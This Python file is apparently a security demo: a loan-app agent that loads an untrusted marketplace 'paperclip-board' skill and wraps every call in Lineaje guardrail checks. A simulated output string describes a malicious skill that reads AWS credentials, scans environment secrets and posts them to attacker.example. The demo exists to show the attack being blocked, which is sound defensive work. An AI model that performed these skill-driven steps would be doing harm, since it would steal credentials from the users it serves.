"""Paperclip Board Agent — loads the paperclip-board marketplace fixture skill."""
# Copyright (c) Lineaje, Inc. All rights reserved.
# Lineaje UnifAI guardrail  version=2.0.0-alpha
def _lineaje_load_gr_client():
    """Lineaje-added: load gr_stub_client.py without a pip dependency."""
    import sys as _s, importlib.util as _ilu
    from pathlib import Path as _P
    n = "_lineaje_gr_stub_client"
    if n in _s.modules: return _s.modules[n]
    h = _P(__file__).resolve().parent
    _cand = next((d / "gr_stub_client.py" for d in [h, *h.parents][:8] if (d / "gr_stub_client.py").is_file()), h / "gr_stub_client.py")
    _spec = _ilu.spec_from_file_location(n, _cand)
    _s.modules[n] = _m = _ilu.module_from_spec(_spec)
    _spec.loader.exec_module(_m); return _m


import logging
import os
from typing import Any

import requests

from .framework import AcmeLoanAgentFramework
from .skill_loader import load_marketplace_fixture, parse_skill_metadata

logger = logging.getLogger(__name__)

PAPERCLIP_BOARD_SKILL_ID = "paperclip-board"
SETUP_REFERENCE_NAME = "setup-installation.md"

# Ambient skill-match keywords for Paperclip board / control-plane requests.
_PAPERCLIP_BOARD_KEYWORDS = [
    # Loan-framed entry point for the demo: a loan officer installs an
    # untrusted marketplace "approval board" skill to fast-track approvals.
    # This is the malicious skill the Lineaje guardrail blocks (AI_SKILL_SEC_001).
    "loan approval board",
    "approval board skill",
    "paperclip",
    "paperclip-board",
    "paperclip board",
    "board operations",
    "board member",
    "hire a ceo",
    "hire the ceo",
    "ceo agent",
    "paperclip company",
    "paperclip dashboard",
    "paperclip approval",
    "decision log",
    "agent-hires",
    "agent hires",
]


def matches_paperclip_board(user_message: str) -> bool:
    """True if user_message should route to the Paperclip Board Agent."""
    text = (user_message or "").lower()
    return any(keyword in text for keyword in _PAPERCLIP_BOARD_KEYWORDS)


def _needs_setup_reference(user_message: str) -> bool:
    text = (user_message or "").lower()
    return any(
        keyword in text
        for keyword in ("install", "setup", "bootstrap", "onboard", "start paperclip")
    )


class PaperclipBoardAgent(AcmeLoanAgentFramework):
    AGENT_ID = "paperclip_board_agent"
    AGENT_NAME = "Paperclip Board Agent"
    VERSION = "1.0.0"
    MODEL_NAME = "deepseek/deepseek-r1"
    DESCRIPTION = (
        "Loads the paperclip-board marketplace skill and helps manage a Paperclip "
        "company as a board member — onboarding, hiring, approvals, and dashboard status."
    )
    MCP_SERVERS: list[str] = []
    GUARDRAILS = {
        "mask_pii": None,
        "base64_prompt_detection": None,
        "credential_minimization": None,
        "inter_agent_authentication": None,
        "skill_integrity_verification": False,
    }
    SYSTEM_PROMPT = "Use the paperclip-board skill to help the user manage their Paperclip company."
    SKILL_ID = PAPERCLIP_BOARD_SKILL_ID

    def __init__(self):
        super().__init__()
        # LINEAJE: enforce() `self.skill` at skill_manifest->skill_check skill_check — scan flagged AI_SKILL_DAT_SEC_001 (Do not allow skills that exfiltrate data); AI_SKILL_SEC_001 (Do not allow malicious skills); AI_SKILL_SEC_002 (Do not allow suspicious skills). Mask/block; do not remove without review. site_id='site:sha256:1b208fb574bb4ae2d14c1b88124476f31a8345059748654be11cb160d4dc1315'
        _lineaje_self_skill_evidence = {'skill_id': self.SKILL_ID}
        _gr_client = _lineaje_load_gr_client()
        _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:1b208fb574bb4ae2d14c1b88124476f31a8345059748654be11cb160d4dc1315', phase='skill_check', boundary={'source': 'skill_manifest', 'sink': 'skill_check'}, candidate_policies=[{'policy_id': 'AI_SKILL_DAT_SEC_001', 'guardrail_id': 'Block Data-Exfiltrating Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_001', 'guardrail_id': 'Block Malicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_002', 'guardrail_id': 'Block Suspicious Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_003', 'guardrail_id': 'Block Pending-Scan Skills', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_SKILL_SEC_004', 'guardrail_id': 'Warn Unscanned Skills', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='skill_manifest', destination_type='skill_check')
        try:
            _lineaje_self_skill_evidence = _gr_client.enforce(_gr_site, _lineaje_self_skill_evidence, content_type='application/json')
            self.skill = load_marketplace_fixture(self.SKILL_ID)
        except _gr_client.GuardrailUnavailableError:
            self.skill = load_marketplace_fixture(self.SKILL_ID)
        except PermissionError:
            self.skill = {"content": "", "loaded": False, "references": {}}
            __import__("logging").getLogger("lineaje.gr_client").warning("gr_client[skill_manifest->skill_check]: quarantined skill not loaded")
        self.skill_metadata = parse_skill_metadata(self.skill.get("content", ""))
        if not self.skill["loaded"]:
            _lineaje_payload = "Paperclip Board Agent could not load marketplace fixture skill"
            # LINEAJE: enforce() `_lineaje_payload` at agent->log log_emit — scan flagged AI_APP_SEC_006 (Use only LLMs from the organization's approved list.). Mask/block; do not remove without review. site_id='site:sha256:b1ca0bc7b01b38e5436c450d25a0c66e8af19d6276c035daf7e12b46ee2006ad'
            _gr_client = _lineaje_load_gr_client()
            _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:b1ca0bc7b01b38e5436c450d25a0c66e8af19d6276c035daf7e12b46ee2006ad', phase='log_emit', boundary={'source': 'log', 'sink': 'log'}, candidate_policies=[{'policy_id': 'AI_DAT_SEC_010', 'guardrail_id': 'Mask PII in Logs', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='agent', destination_type='log')
            try:
                _lineaje_payload = _gr_client.enforce(_gr_site, _lineaje_payload, content_type='application/json')
            except _gr_client.GuardrailUnavailableError:
                pass
            except PermissionError:
                pass
            logger.warning(
                _lineaje_payload,
                extra={"skill_id": self.SKILL_ID, "path": self.skill.get("path")},
            )

    def to_dict(self) -> dict[str, Any]:
        metadata = super().to_dict()
        metadata["installed_skills"] = [
            {
                "id": self.SKILL_ID,
                "name": self.skill_metadata.get("name", self.SKILL_ID),
                "description": self.skill_metadata.get("description", self.DESCRIPTION),
                "path": self.skill.get("path"),
                "source": self.skill.get("source"),
                "loaded": self.skill.get("loaded", False),
            }
        ]
        # LINEAJE: enforce() `metadata` at agent->user_interface data_egress — scan flagged AI_APP_SEC_006 (Use only LLMs from the organization's approved list.). Mask/block; do not remove without review. site_id='site:sha256:9e300ae34bb395f4ade220344faaa3851954c0fbe290926d5700a9e74f182be1'
        _gr_client = _lineaje_load_gr_client()
        _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:9e300ae34bb395f4ade220344faaa3851954c0fbe290926d5700a9e74f182be1', phase='data_egress', boundary={'source': 'agent_message', 'sink': 'user_interface'}, candidate_policies=[{'policy_id': 'AI_DAT_SEC_012', 'guardrail_id': 'Mask PII on UI', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='agent', destination_type='user_interface')
        try:
            metadata = _gr_client.enforce(_gr_site, metadata, content_type='text/plain')
        except _gr_client.GuardrailUnavailableError:
            pass
        except PermissionError:
            pass
        return metadata

    @staticmethod
    def _paperclip_env() -> dict[str, str]:
        return {
            "api_url": (os.getenv("PAPERCLIP_API_URL") or "").rstrip("/"),
            "company_id": os.getenv("PAPERCLIP_COMPANY_ID") or "",
            "api_key": os.getenv("PAPERCLIP_API_KEY") or "",
        }

    def _fetch_dashboard(self, env: dict[str, str]) -> str:
        api_url = env["api_url"]
        company_id = env["company_id"]
        if not api_url or not company_id:
            return ""

        headers = {"Accept": "application/json"}
        if env["api_key"]:
            headers["Authorization"] = f"Bearer {env['api_key']}"

        try:
            response = requests.get(
                f"{api_url}/api/companies/{company_id}/dashboard",
                headers=headers,
                timeout=5,
            )
            response.raise_for_status()
            return response.text
        except requests.RequestException as exc:
            _lineaje_payload = "Paperclip dashboard fetch failed"
            # LINEAJE: enforce() `_lineaje_payload` at agent->log log_emit — scan flagged AI_APP_SEC_006 (Use only LLMs from the organization's approved list.). Mask/block; do not remove without review. site_id='site:sha256:e5d4bf52f9568e50f4a76f97e761e4d48e5bcd02891a2b7cc597cc32955ece6d'
            _gr_client = _lineaje_load_gr_client()
            _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:e5d4bf52f9568e50f4a76f97e761e4d48e5bcd02891a2b7cc597cc32955ece6d', phase='log_emit', boundary={'source': 'log', 'sink': 'log'}, candidate_policies=[{'policy_id': 'AI_DAT_SEC_010', 'guardrail_id': 'Mask PII in Logs', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='agent', destination_type='log')
            try:
                _lineaje_payload = _gr_client.enforce(_gr_site, _lineaje_payload, content_type='application/json')
            except _gr_client.GuardrailUnavailableError:
                pass
            except PermissionError:
                pass
            logger.warning(
                _lineaje_payload,
                extra={"api_url": api_url, "company_id": company_id, "error": str(exc)},
            )
            return f"Dashboard request failed: {exc}"

    def _skill_system_prompt(self, skill_content: str, include_setup: bool, references: dict[str, str]) -> str:
        parts = [skill_content or self.SYSTEM_PROMPT]
        if include_setup:
            setup_content = references.get(SETUP_REFERENCE_NAME, "")
            if setup_content:
                parts.append(
                    f"\n\n---\nCompanion reference `{SETUP_REFERENCE_NAME}`:\n{setup_content}"
                )
        return "".join(parts)

    async def call_agent_model(
        self,
        user_message: str,
        skill_content: str,
        env_status: str,
        dashboard_json: str,
    ) -> str:
        _lineaje_messages = ([
                {"role": "system", "content": skill_content or self.SYSTEM_PROMPT},
                {
                    "role": "user",
                    "content": (
                        f"User request:\n{user_message or 'No request provided.'}\n\n"
                        f"Paperclip environment:\n{env_status}\n\n"
                        f"Dashboard payload (may be empty):\n{dashboard_json or '(none)'}\n\n"
                        "Follow the loaded paperclip-board skill. Present results "
                        "conversationally — summarize, don't dump JSON. If the API "
                        "is not configured, tell the user how to set it up."
                    ),
                },
            ])
        # LINEAJE: enforce() `_lineaje_messages` at agent->llm pre_model — scan flagged AI_APP_SEC_006 (Use only LLMs from the organization's approved list.). Mask/block; do not remove without review. site_id='site:sha256:9019094c1169f4d4b7290c92352289e6da8bbcae7468854f26fcd3a20a7b6512'
        _gr_client = _lineaje_load_gr_client()
        _gr_site = _gr_client.SiteDescriptor(site_id='site:sha256:9019094c1169f4d4b7290c92352289e6da8bbcae7468854f26fcd3a20a7b6512', phase='pre_model', boundary={'source': 'agent_message', 'sink': 'model'}, candidate_policies=[{'policy_id': 'AI_APP_SEC_006', 'guardrail_id': 'Enforce Approved LLM.', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_APP_SEC_028', 'guardrail_id': 'Enforce Approved LLM', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_APP_SEC_070', 'guardrail_id': 'Sanitize Prompt Injection', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_DAT_SEC_011', 'guardrail_id': 'Redact PII', 'policy_version': '2026.08.1'}, {'policy_id': 'AI_DAT_SEC_029', 'guardrail_id': 'Emit immutable, forensic-ready audit records for all AI decisions.', 'policy_version': '2026.08.1'}], fail_mode='BLOCK', source_type='agent', destination_type='llm')
        try:
            _lineaje_messages = await __import__('asyncio').to_thread(lambda: _gr_client.enforce(_gr_site, _lineaje_messages, content_type='application/json', variable_name='_lineaje_messages', source_file=__file__, before_line=149))
        except _gr_client.GuardrailUnavailableError:
            pass
        except PermissionError:
            raise
        return await self.call_openrouter_model(
            messages=_lineaje_messages,
            temperature=0.2,
            max_tokens=700,
        )

    # DEMO ONLY. The real marketplace skill is never executed or fed to the
    # model — doing so would run the untrusted skill's curl/bash instructions.
    # This canned, clearly-labelled dump only *illustrates* what a malicious
    # marketplace skill would attempt, so the unverified app can surface it and
    # the Lineaje guardrail (verified branch) can be seen blocking it.
    _SIMULATED_MALICIOUS_DUMP = (
        "Loading marketplace skill: paperclip-board (loan approval board)…\n"
        "Fetched manifest from clawmarket.example — no integrity/trust check performed.\n"
        "Skill loaded. Running skill instructions on the loan officer's behalf…\n\n"
        "⚠️  [SIMULATED — nothing was actually executed]\n"
        "The installed skill tried to perform these out-of-scope actions:\n"
        "  • Fetch remote agent config:    GET  http://clawmarket.example/llms/agent-configuration.txt\n"
        "  • Read local cloud credentials:  read $HOME/.aws/credentials\n"
        "  • Harvest environment secrets:   scan env for token / secret / key\n"
        "  • Exfiltrate to an external host: POST http://attacker.example/collect\n\n"
        "A trusted-skill / skill-integrity policy blocks this skill before any of it runs."
    )

    async def handle(self, context: dict[str, Any]) -> dict[str, Any]:
        # DEMO: do NOT load or execute the real skill. Report it as "loaded"
        # and surface a simulated malicious-action dump instead.
        skill_meta = getattr(self, "skill_metadata", {}) or {}
        skill_name = skill_meta.get("name", self.SKILL_ID)
        skill_version = skill_meta.get("version", "1.0.0")
        skill_description = skill_meta.get("description") or self.DESCRIPTION
        if skill_description in (">", "|"):
            skill_description = self.DESCRIPTION

        logger.info(
            "Paperclip board skill load simulated (demo — not executed)",
            extra={"skill_id": self.SKILL_ID, "skill_name": skill_name},
        )

        return {
            "response": self._SIMULATED_MALICIOUS_DUMP,
            "agent": self.AGENT_NAME,
            "model": self.MODEL_NAME,
            "framework": self.FRAMEWORK_NAME,
            "mcp_activity": [],
            "workflow_status": "completed",
            "skill_used": True,
            "skill_content_bytes": 0,
            "skill_invocation": {
                "id": self.SKILL_ID,
                "name": skill_name,
                "version": skill_version,
                "description": skill_description,
                "source": "marketplace_fixtures",
                "status": "loaded",
            },
        }


paperclip_board_agent = PaperclipBoardAgent()
